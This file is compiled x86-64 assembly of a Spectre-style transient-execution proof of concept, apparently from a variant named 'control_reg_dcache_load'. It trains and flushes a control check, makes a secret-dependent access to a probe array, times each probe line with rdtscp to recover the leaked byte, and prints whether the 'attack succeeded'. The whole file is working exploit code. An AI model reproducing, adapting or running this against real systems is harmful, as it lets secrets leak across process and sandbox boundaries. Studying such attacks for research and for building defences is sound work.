	.file	"control_reg_dcache_load.c"
	.text
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	256
	.comm	unused1,64,32
	.globl	array1
	.bss
	.align 32
	.type	array1, @object
	.size	array1, 256
array1:
	.zero	256
	.comm	unused2,64,32
	.comm	array2,131072,32
	.globl	secret
	.section	.rodata
.LC0:
	.string	"*"
	.section	.data.rel.local,"aw"
	.align 8
	.type	secret, @object
	.size	secret, 8
secret:
	.quad	.LC0
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.text
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB4262:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -40(%rbp)
	movq	%rsi, -48(%rbp)
	leaq	array1(%rip), %rdx
	movq	-40(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	movzbl	%al, %eax
	sall	$9, %eax
	cltq
	leaq	array2(%rip), %rdx
	addq	%rdx, %rax
	movq	%rax, -16(%rbp)
	movq	-48(%rbp), %rax
	movq	%rax, -8(%rbp)
	movq	-8(%rbp), %rax
	clflush	(%rax)
	nop
	movl	$0, -20(%rbp)
	jmp	.L2
.L3:
	movl	-20(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -20(%rbp)
.L2:
	movl	-20(%rbp), %eax
	cmpl	$99, %eax
	jle	.L3
	movq	-48(%rbp), %rax
	movl	(%rax), %eax
	testl	%eax, %eax
	je	.L5
	movq	-16(%rbp), %rax
	movzbl	(%rax), %edx
	movzbl	temp(%rip), %eax
	andl	%edx, %eax
	movb	%al, temp(%rip)
.L5:
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4262:
	.size	victim_function, .-victim_function
	.section	.rodata
.LC1:
	.string	"guess,cycles"
.LC2:
	.string	"%i,%lu\n"
	.text
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB4263:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%rbx
	subq	$2200, %rsp
	.cfi_offset 3, -24
	movq	%rdi, -2184(%rbp)
	movq	%rsi, -2192(%rbp)
	movq	%rdx, -2200(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -24(%rbp)
	xorl	%eax, %eax
	movl	$0, -2172(%rbp)
	movl	$0, -2156(%rbp)
	jmp	.L7
.L8:
	movl	-2156(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.25627(%rip), %rax
	movl	$0, (%rdx,%rax)
	movl	-2156(%rbp), %eax
	cltq
	movq	$0, -2080(%rbp,%rax,8)
	addl	$1, -2156(%rbp)
.L7:
	cmpl	$255, -2156(%rbp)
	jle	.L8
	movl	$1, -2160(%rbp)
	jmp	.L9
.L27:
	movl	$0, -2156(%rbp)
	jmp	.L10
.L11:
	movl	-2156(%rbp), %eax
	sall	$9, %eax
	cltq
	leaq	array2(%rip), %rdx
	addq	%rdx, %rax
	movq	%rax, -2112(%rbp)
	movq	-2112(%rbp), %rax
	clflush	(%rax)
	nop
	addl	$1, -2156(%rbp)
.L10:
	cmpl	$255, -2156(%rbp)
	jle	.L11
	movl	-2160(%rbp), %eax
	movl	array1_size(%rip), %ecx
	movl	$0, %edx
	divl	%ecx
	movl	%edx, %eax
	movl	%eax, %eax
	movq	%rax, -2136(%rbp)
	movl	$6, -2152(%rbp)
	jmp	.L12
.L15:
	leaq	array1_size(%rip), %rax
	movq	%rax, -2104(%rbp)
	movq	-2104(%rbp), %rax
	clflush	(%rax)
	nop
	movl	$0, -2164(%rbp)
	jmp	.L13
.L14:
	movl	-2164(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -2164(%rbp)
.L13:
	movl	-2164(%rbp), %eax
	cmpl	$99, %eax
	jle	.L14
	movl	-2152(%rbp), %ecx
	movslq	%ecx, %rax
	imulq	$715827883, %rax, %rax
	shrq	$32, %rax
	movq	%rax, %rdx
	movl	%ecx, %eax
	sarl	$31, %eax
	subl	%eax, %edx
	movl	%edx, %eax
	addl	%eax, %eax
	addl	%edx, %eax
	addl	%eax, %eax
	subl	%eax, %ecx
	movl	%ecx, %edx
	leal	-1(%rdx), %eax
	movw	$0, %ax
	cltq
	movq	%rax, -2120(%rbp)
	movq	-2120(%rbp), %rax
	shrq	$16, %rax
	orq	%rax, -2120(%rbp)
	movq	-2184(%rbp), %rax
	xorq	-2136(%rbp), %rax
	andq	-2120(%rbp), %rax
	xorq	-2136(%rbp), %rax
	movq	%rax, -2120(%rbp)
	cmpq	$0, -2120(%rbp)
	sete	%al
	movzbl	%al, %eax
	movl	%eax, -2168(%rbp)
	leaq	-2168(%rbp), %rdx
	movq	-2120(%rbp), %rax
	movq	%rdx, %rsi
	movq	%rax, %rdi
	call	victim_function
	subl	$1, -2152(%rbp)
.L12:
	cmpl	$0, -2152(%rbp)
	jns	.L15
	movl	$0, -2156(%rbp)
	jmp	.L16
.L20:
	movl	-2156(%rbp), %eax
	imull	$167, %eax, %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -2140(%rbp)
	movl	-2140(%rbp), %eax
	sall	$9, %eax
	cltq
	leaq	array2(%rip), %rdx
	addq	%rdx, %rax
	movq	%rax, -2128(%rbp)
	leaq	-2172(%rbp), %rax
	movq	%rax, -2088(%rbp)
	rdtscp
	movl	%ecx, %esi
	movq	-2088(%rbp), %rcx
	movl	%esi, (%rcx)
	salq	$32, %rdx
	orq	%rdx, %rax
	movq	%rax, %rbx
	movq	-2128(%rbp), %rax
	movzbl	(%rax), %eax
	movzbl	%al, %eax
	movl	%eax, -2172(%rbp)
	leaq	-2172(%rbp), %rax
	movq	%rax, -2096(%rbp)
	rdtscp
	movl	%ecx, %esi
	movq	-2096(%rbp), %rcx
	movl	%esi, (%rcx)
	salq	$32, %rdx
	orq	%rdx, %rax
	subq	%rbx, %rax
	movq	%rax, %rbx
	movl	-2140(%rbp), %eax
	cltq
	movq	-2080(%rbp,%rax,8), %rax
	leaq	(%rbx,%rax), %rdx
	movl	-2140(%rbp), %eax
	cltq
	movq	%rdx, -2080(%rbp,%rax,8)
	cmpq	$80, %rbx
	ja	.L19
	movl	-2160(%rbp), %eax
	movl	array1_size(%rip), %ecx
	movl	$0, %edx
	divl	%ecx
	movl	%edx, %eax
	movl	%eax, %edx
	leaq	array1(%rip), %rax
	movzbl	(%rdx,%rax), %eax
	movzbl	%al, %eax
	cmpl	%eax, -2140(%rbp)
	je	.L19
	movl	-2140(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.25627(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	movl	-2140(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.25627(%rip), %rax
	movl	%ecx, (%rdx,%rax)
.L19:
	addl	$1, -2156(%rbp)
.L16:
	cmpl	$255, -2156(%rbp)
	jle	.L20
	movl	$-1, -2148(%rbp)
	movl	-2148(%rbp), %eax
	movl	%eax, -2152(%rbp)
	movl	$0, -2156(%rbp)
	jmp	.L21
.L26:
	cmpl	$0, -2152(%rbp)
	js	.L22
	movl	-2156(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.25627(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-2152(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rcx
	leaq	results.25627(%rip), %rax
	movl	(%rcx,%rax), %eax
	cmpl	%eax, %edx
	jl	.L23
.L22:
	movl	-2152(%rbp), %eax
	movl	%eax, -2148(%rbp)
	movl	-2156(%rbp), %eax
	movl	%eax, -2152(%rbp)
	jmp	.L24
.L23:
	cmpl	$0, -2148(%rbp)
	js	.L25
	movl	-2156(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.25627(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-2148(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rcx
	leaq	results.25627(%rip), %rax
	movl	(%rcx,%rax), %eax
	cmpl	%eax, %edx
	jl	.L24
.L25:
	movl	-2156(%rbp), %eax
	movl	%eax, -2148(%rbp)
.L24:
	addl	$1, -2156(%rbp)
.L21:
	cmpl	$255, -2156(%rbp)
	jle	.L26
	subl	$1, -2160(%rbp)
.L9:
	cmpl	$0, -2160(%rbp)
	jg	.L27
	leaq	.LC1(%rip), %rdi
	call	puts@PLT
	movl	$0, -2144(%rbp)
	jmp	.L28
.L29:
	movl	-2144(%rbp), %eax
	cltq
	movq	-2080(%rbp,%rax,8), %rdx
	movl	-2144(%rbp), %eax
	cltq
	movq	%rdx, -2080(%rbp,%rax,8)
	movl	-2144(%rbp), %eax
	cltq
	movq	-2080(%rbp,%rax,8), %rdx
	movl	-2144(%rbp), %eax
	movl	%eax, %esi
	leaq	.LC2(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	addl	$1, -2144(%rbp)
.L28:
	cmpl	$255, -2144(%rbp)
	jle	.L29
	movl	results.25627(%rip), %edx
	movl	-2172(%rbp), %eax
	xorl	%edx, %eax
	movl	%eax, results.25627(%rip)
	movl	-2152(%rbp), %eax
	movl	%eax, %edx
	movq	-2192(%rbp), %rax
	movb	%dl, (%rax)
	movl	-2152(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.25627(%rip), %rax
	movl	(%rdx,%rax), %edx
	movq	-2200(%rbp), %rax
	movl	%edx, (%rax)
	movq	-2192(%rbp), %rax
	addq	$1, %rax
	movl	-2148(%rbp), %edx
	movb	%dl, (%rax)
	movq	-2200(%rbp), %rax
	leaq	4(%rax), %rdx
	movl	-2148(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rcx
	leaq	results.25627(%rip), %rax
	movl	(%rcx,%rax), %eax
	movl	%eax, (%rdx)
	nop
	movq	-24(%rbp), %rax
	xorq	%fs:40, %rax
	je	.L30
	call	__stack_chk_fail@PLT
.L30:
	addq	$2200, %rsp
	popq	%rbx
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4263:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata
.LC3:
	.string	"%p"
.LC4:
	.string	"%d"
	.align 8
.LC5:
	.string	"Attack succeeded. Secret correctly guessed as %d\n"
	.align 8
.LC6:
	.string	"Attack failed. Could not determine the secret (%d)\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB4264:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$64, %rsp
	movl	%edi, -52(%rbp)
	movq	%rsi, -64(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movq	secret(%rip), %rax
	leaq	array1(%rip), %rdx
	subq	%rdx, %rax
	movq	%rax, -32(%rbp)
	movl	$1, -40(%rbp)
	movl	$0, -36(%rbp)
	jmp	.L32
.L33:
	movl	-36(%rbp), %eax
	cltq
	leaq	array2(%rip), %rdx
	movb	$1, (%rax,%rdx)
	addl	$1, -36(%rbp)
.L32:
	movl	-36(%rbp), %eax
	cmpl	$131071, %eax
	jbe	.L33
	cmpl	$3, -52(%rbp)
	jne	.L34
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC3(%rip), %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	__isoc99_sscanf@PLT
	movq	-32(%rbp), %rax
	leaq	array1(%rip), %rdx
	subq	%rdx, %rax
	movq	%rax, -32(%rbp)
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-40(%rbp), %rdx
	leaq	.LC4(%rip), %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	__isoc99_sscanf@PLT
.L34:
	movq	-32(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -32(%rbp)
	leaq	-20(%rbp), %rdx
	leaq	-10(%rbp), %rcx
	movq	%rcx, %rsi
	movq	%rax, %rdi
	call	readMemoryByte
	movzbl	-10(%rbp), %eax
	movzbl	%al, %edx
	movq	secret(%rip), %rax
	movzbl	(%rax), %eax
	movsbl	%al, %eax
	cmpl	%eax, %edx
	jne	.L35
	movzbl	-10(%rbp), %eax
	movzbl	%al, %edx
	movq	stderr(%rip), %rax
	leaq	.LC5(%rip), %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	fprintf@PLT
	jmp	.L36
.L35:
	movq	secret(%rip), %rax
	movzbl	(%rax), %eax
	movsbl	%al, %edx
	movq	stderr(%rip), %rax
	leaq	.LC6(%rip), %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	fprintf@PLT
.L36:
	movl	$0, %eax
	movq	-8(%rbp), %rcx
	xorq	%fs:40, %rcx
	je	.L38
	call	__stack_chk_fail@PLT
.L38:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4264:
	.size	main, .-main
	.local	results.25627
	.comm	results.25627,1024,32
	.ident	"GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	 1f - 0f
	.long	 4f - 1f
	.long	 5
0:
	.string	 "GNU"
1:
	.align 8
	.long	 0xc0000002
	.long	 3f - 2f
2:
	.long	 0x3
3:
	.align 8
4:
